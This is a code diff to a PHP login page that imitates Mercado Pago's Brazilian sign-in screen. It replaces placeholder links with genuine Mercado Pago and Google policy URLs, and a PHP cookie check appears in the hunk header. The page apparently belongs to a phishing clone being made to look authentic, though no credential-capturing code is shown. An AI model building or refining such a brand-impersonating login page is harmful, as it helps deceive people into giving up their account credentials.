@@ -92,12 +92,12 @@ if (!isset($_COOKIE['identificador_cliente'])) {
                     <div id="error-message" class="error-message"></div>
                 </div>
                 <button type="submit" class="btn-continue">Continuar</button>
-                <a href="#" class="link-create">Criar conta</a>
+                <a href="https://www.mercadopago.com.br/hub/registration/fiscal-splitter?contextual=normal&redirect_url=https%3A%2F%2Fwww.mercadopago.com.br%2F" class="link-create">Criar conta</a>
             </form>
         </div>
 
         <div class="support-wrapper">
-            <a href="#" class="security-link">
+            <a href="https://www.mercadopago.com.br/ato-complaint/classifier?origin=LOGIN_IDENTIFICATION_WEB" class="security-link">
                 <span class="icon-text">
                     <svg xmlns="http://www.w3.org/2000/svg" width="27" height="26" fill="none" aria-hidden="true"><path fill="#000" fill-opacity="0.9" fill-rule="evenodd" d="M11.715 25.15C3.915 22.55 0 16.02 0 5.791V4.87h.924c3.462 0 6.955-1.448 10.494-4.38l.59-.489.589.488a23.955 23.955 0 002.914 2.087l-1.684 1.122a25.984 25.984 0 01-1.82-1.31C8.655 5.022 5.27 6.463 1.857 6.686c.212 8.828 3.585 14.298 10.15 16.61 2.287-.805 4.186-1.993 5.699-3.572h2.43c-1.909 2.506-4.522 4.32-7.837 5.425l-.292.098-.292-.098z" clip-rule="evenodd"></path><path fill="#000" fill-opacity="0.9" fill-rule="evenodd" d="M19.505 4.734a5.917 5.917 0 00-5.4 8.34l.25.556-.19.58-.888 2.722 2.978-.85.523-.15.504.205a5.917 5.917 0 102.223-11.403zM12.01 10.65a7.495 7.495 0 114.678 6.948l-4.678 1.336-.79-.79 1.445-4.425a7.468 7.468 0 01-.655-3.07z" clip-rule="evenodd"></path><path fill="#000" fill-opacity="0.9" d="M20.27 7.4h-1.53l.192 4.207h1.147l.192-4.208zm-.764 4.972a.765.765 0 110 1.53.765.765 0 010-1.53z"></path></svg>
                     <span>Tenho um problema de segurança</span>
@@ -111,10 +111,10 @@ if (!isset($_COOKIE['identificador_cliente'])) {
     <footer class="main-footer-mobile">
         <div>
             <span>Protegido por reCAPTCHA - </span>
-            <a href="#">Privacidade</a> - <a href="#">Condições</a>
+            <a href="https://policies.google.com/privacy?hl=pt-BR">Privacidade</a> - <a href="https://policies.google.com/terms?hl=pt-BR">Condições</a>
         </div>
         <div class="copyright">
-            <a href="#">Como cuidamos da sua privacidade</a><br>
+            <a href="https://www.mercadopago.com.br/privacidade">Como cuidamos da sua privacidade</a><br>
             <span>Copyright © 1999-2025 Ebazar.com.br LTDA.</span>
         </div>
     </footer>
